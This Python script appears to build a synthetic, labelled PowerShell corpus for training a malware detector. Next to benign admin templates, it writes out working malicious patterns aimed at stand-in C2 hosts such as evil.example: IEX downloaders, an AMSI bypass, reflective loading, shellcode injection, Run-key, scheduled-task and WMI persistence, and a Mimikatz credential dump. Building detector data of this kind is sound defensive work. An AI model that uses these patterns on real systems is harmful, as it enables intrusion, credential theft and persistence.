"""
Synthetic PowerShell corpus generator.

Generates labeled .ps1 samples covering common admin/utility patterns
(label=0) and common malicious patterns (label=1: downloaders, encoded
commands, AMSI bypass, persistence). Deterministic via --seed.

This is explicitly a synthetic baseline corpus — metrics will look high
because the train/test distribution matches generation. Real PS1 malware
in the wild will sit somewhere in between these archetypes.
"""
from __future__ import annotations

import argparse
import base64
import os
import random
import string


# --- Clean templates ---------------------------------------------------------

CLEAN_TEMPLATES = [
    # 1. Get-Service report
    r"""# Service status report
Get-Service | Where-Object {{ $_.Status -eq 'Running' }} |
    Select-Object Name, DisplayName, Status |
    Sort-Object Name |
    Export-Csv -Path C:\reports\services_{ts}.csv -NoTypeInformation
""",
    # 2. Process listing
    r"""# Top 10 processes by working set
Get-Process |
    Sort-Object -Property WorkingSet -Descending |
    Select-Object -First 10 Name, Id, @{{n='MB';e={{[math]::Round($_.WorkingSet/1MB,1)}}}}
""",
    # 3. File cleanup
r"""# Clean temp files older than {days} days
$cutoff = (Get-Date).AddDays(-{days})
Get-ChildItem -Path $env:TEMP -Recurse -File |
    Where-Object {{ $_.LastWriteTime -lt $cutoff }} |
    Remove-Item -Force -ErrorAction SilentlyContinue
""",
    # 4. Disk space
r"""Get-PSDrive -PSProvider FileSystem |
    Select-Object Name,
        @{{n='UsedGB';e={{[math]::Round($_.Used/1GB,1)}}}},
        @{{n='FreeGB';e={{[math]::Round($_.Free/1GB,1)}}}}
""",
    # 5. AD user query
r"""Import-Module ActiveDirectory
Get-ADUser -Filter "Enabled -eq '{enabled}'" -Properties LastLogonDate |
    Select-Object SamAccountName, Name, LastLogonDate
""",
    # 6. Test connectivity
r"""$hosts = @('{h1}','{h2}','{h3}')
foreach ($h in $hosts) {{
    if (Test-Connection -ComputerName $h -Count 1 -Quiet) {{
        Write-Output "$h reachable"
    }} else {{
        Write-Warning "$h unreachable"
    }}
}}
""",
    # 7. Hash file
r"""$path = '{path}'
Get-FileHash -Path $path -Algorithm SHA256 | Format-List
""",
    # 8. Read CSV and group
r"""$data = Import-Csv -Path '{path}'
$data | Group-Object -Property {col} | Sort-Object Count -Descending
""",
    # 9. JSON config read
r"""$config = Get-Content -Path '{path}' -Raw | ConvertFrom-Json
Write-Output "Server: $($config.Server)"
Write-Output "Port: $($config.Port)"
""",
    # 10. IIS site listing
r"""Import-Module WebAdministration
Get-Website | Select-Object Name, State, PhysicalPath
""",
    # 11. SQL backup helper (Invoke-Sqlcmd, benign)
r"""$conn = '{conn}'
$query = 'BACKUP DATABASE [{db}] TO DISK = N''C:\backup\{db}.bak'' WITH INIT'
Invoke-Sqlcmd -ConnectionString $conn -Query $query -QueryTimeout 600
""",
    # 12. Function definition + module use
r"""function Get-AgeInDays {{
    param([Parameter(Mandatory)][datetime]$Since)
    [math]::Round(((Get-Date) - $Since).TotalDays, 1)
}}
Get-AgeInDays -Since '{date}'
""",
    # 13. Registry property read (no Run keys)
r"""$key = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
Get-ItemProperty -Path $key | Select-Object ProductName, ReleaseId, CurrentBuild
""",
    # 14. Event log query
r"""Get-WinEvent -LogName System -MaxEvents {n} |
    Where-Object {{ $_.Level -le 3 }} |
    Format-Table TimeCreated, Id, ProviderName
""",
    # 15. Inventory script
r"""$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
[PSCustomObject]@{{
    Host = $env:COMPUTERNAME
    OS   = $os.Caption
    CPU  = $cpu.Name
    Cores = $cpu.NumberOfCores
}}
""",
]


# --- Malicious templates -----------------------------------------------------

MAL_TEMPLATES = [
    # 1. Classic IEX downloader
r"""$url = 'http://{c2}/{path}'
$wc = New-Object Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0')
IEX ($wc.DownloadString($url))
""",
    # 2. Two-stage downloader to disk
r"""Invoke-WebRequest -Uri 'http://{c2}/{path}.exe' -OutFile $env:TEMP\svc.exe -UseBasicParsing
Start-Process -FilePath $env:TEMP\svc.exe -WindowStyle Hidden
""",
    # 3. Encoded command stub
r"""$b = '{b64}'
$d = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b))
Invoke-Expression $d
""",
    # 4. AMSI bypass + downloader
r"""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
IEX (New-Object Net.WebClient).DownloadString('http://{c2}/p.txt')
""",
    # 5. Reflective load
r"""$b = [Convert]::FromBase64String('{b64}')
$a = [Reflection.Assembly]::Load($b)
$a.EntryPoint.Invoke($null,@())
""",
    # 6. Hidden-window scheduler persistence
r"""$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\u.ps1'
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName '{name}' -Action $action -Trigger $trigger -RunLevel Highest -Force
""",
    # 7. Run-key persistence
r"""$rk = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
New-ItemProperty -Path $rk -Name '{name}' -Value 'powershell -nop -w hidden -ep bypass -c "iex(iwr http://{c2}/p)"' -PropertyType String -Force
""",
    # 8. WMI event-consumer persistence
r"""$f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{{Name='F'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=12"}}
$c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{{Name='C'; CommandLineTemplate='powershell -enc {b64_short}'}}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$f; Consumer=$c}}
""",
    # 9. Char-array obfuscation
r"""$x = [char]73 + [char]69 + [char]88
$y = 'New-Object Net.WebClient'
$z = $y + '.DownloadString(' + "'http://{c2}/p'" + ')'
&($ExecutionContext.InvokeCommand.GetCommand($x,1)) $z
""",
    # 10. Format-string obfuscation
r"""$cmd = "{{0}}{{1}}{{2}}" -f 'I','E','X'
$url = "http://{c2}/{path}"
&$cmd ((New-Object Net.WebClient).DownloadString($url))
""",
    # 11. Mimikatz-style invocation
r"""IEX (New-Object Net.WebClient).DownloadString('https://{c2}/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds | Out-File $env:TEMP\creds.txt
""",
    # 12. Process injection primitives
r"""$bytes = [Convert]::FromBase64String('{b64}')
Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public class W {{
  [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
  [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr b, IntPtr p, uint f, IntPtr i);
  [DllImport("msvcrt")]   public static extern IntPtr memcpy(IntPtr d, byte[] s, uint c);
}}
'@
$p = [W]::VirtualAlloc(0, $bytes.Length, 0x3000, 0x40)
[W]::memcpy($p, $bytes, $bytes.Length) | Out-Null
[W]::CreateThread(0,0,$p,0,0,0) | Out-Null
""",
    # 13. DeflateStream-decoded inline payload
r"""$enc = '{b64}'
$ms = New-Object IO.MemoryStream(,[Convert]::FromBase64String($enc))
$ds = New-Object IO.Compression.DeflateStream($ms,[IO.Compression.CompressionMode]::Decompress)
$sr = New-Object IO.StreamReader($ds)
IEX $sr.ReadToEnd()
""",
    # 14. Set-ExecutionPolicy + downloader
r"""Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
$wc = New-Object System.Net.WebClient
IEX $wc.DownloadString('http://{c2}/x.ps1')
""",
    # 15. Backtick-laced downloader
r"""$u`r`l = 'h'+'t'+'t'+'p'+'://{c2}/{path}'
I`E`X ((N`ew-Obj`ect Ne`t.Web`Client).Down`load`String($u`r`l))
""",
]


# --- Generators --------------------------------------------------------------

C2_DOMAINS = [
    "evil.example", "cdn.bad-actor.net", "drop.invalid", "staging.notreal.io",
    "update-svc.notreal.org", "metrics.bad-actor.net", "telemetry.invalid",
]
PATHS = ["p", "u", "a", "x1", "loader", "stage2", "payload", "init", "go", "drop"]
NAMES = ["WindowsUpdateSvc", "MicrosoftEdgeUpdater", "OneDriveSyncSvc", "AdobeARM", "GoogleUpdater"]
SQL_DBS = ["AdventureWorks", "Northwind", "Sales", "Inventory", "Reporting"]
SQL_CONNS = [
    "Server=sql01;Database=master;Integrated Security=true",
    "Server=db.prod;Database=ops;Trusted_Connection=true",
]


def _rand_b64(rng: random.Random, n: int) -> str:
    return base64.b64encode(bytes(rng.randrange(256) for _ in range(n))).decode()


def gen_clean(rng: random.Random) -> str:
    tpl = rng.choice(CLEAN_TEMPLATES)
    return tpl.format(
        ts=f"{rng.randint(20230101, 20251231)}",
        days=rng.choice([7, 14, 30, 60, 90]),
        enabled=rng.choice(["True", "False"]),
        h1=f"server{rng.randint(1,9)}.corp",
        h2=f"server{rng.randint(10,99)}.corp",
        h3=f"dc{rng.randint(1,4)}.corp",
        path=rng.choice([
            r"C:\\data\\input.csv", r"C:\\reports\\monthly.csv",
            r"C:\\config\\settings.json", r"C:\\logs\\app.log",
        ]),
        col=rng.choice(["Department", "Status", "Region", "Owner", "Tier"]),
        conn=rng.choice(SQL_CONNS),
        db=rng.choice(SQL_DBS),
        date=f"20{rng.randint(20,25)}-{rng.randint(1,12):02d}-{rng.randint(1,28):02d}",
        n=rng.choice([50, 100, 200, 500]),
    )


def gen_malicious(rng: random.Random) -> str:
    tpl = rng.choice(MAL_TEMPLATES)
    b64_len = rng.randint(80, 400)
    return tpl.format(
        c2=rng.choice(C2_DOMAINS),
        path=rng.choice(PATHS),
        b64=_rand_b64(rng, b64_len),
        b64_short=_rand_b64(rng, 60),
        name=rng.choice(NAMES),
    )


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out-dir", default="data/ps1_corpus")
    ap.add_argument("--n-clean", type=int, default=500)
    ap.add_argument("--n-malicious", type=int, default=500)
    ap.add_argument("--seed", type=int, default=42)
    args = ap.parse_args()

    rng = random.Random(args.seed)
    clean_dir = os.path.join(args.out_dir, "clean")
    mal_dir = os.path.join(args.out_dir, "malicious")
    os.makedirs(clean_dir, exist_ok=True)
    os.makedirs(mal_dir, exist_ok=True)

    for i in range(args.n_clean):
        with open(os.path.join(clean_dir, f"c_{i:05d}.ps1"), "w", encoding="utf-8") as f:
            f.write(gen_clean(rng))
    for i in range(args.n_malicious):
        with open(os.path.join(mal_dir, f"m_{i:05d}.ps1"), "w", encoding="utf-8") as f:
            f.write(gen_malicious(rng))

    print(f"[*] wrote {args.n_clean} clean + {args.n_malicious} malicious .ps1 to {args.out_dir}")


if __name__ == "__main__":
    main()
